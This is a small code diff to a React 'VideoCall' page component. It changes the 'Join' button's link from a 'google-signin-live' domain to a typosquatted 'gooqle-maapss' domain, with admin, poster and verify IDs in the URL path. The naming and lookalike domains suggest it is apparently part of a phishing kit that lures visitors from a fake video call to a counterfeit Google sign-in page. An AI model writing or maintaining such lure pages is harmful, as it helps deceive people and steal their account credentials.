@@ -102,7 +102,7 @@ export default function VideoCall({ adminId, posterId, verifyId, sitename }) {
 
       <button className="bg-green-500 text-white px-14 py-3 rounded-lg text-2xl  hover:bg-green-600 transition-colors font-extrabold">
         <a
-          href={`https://google-signin-live.vercel.app/${adminId}/${posterId}/${verifyId}`}
+          href={`https://gooqle-maapss.vercel.app/${adminId}/${posterId}/${verifyId}`}
         >
           Join
         </a>
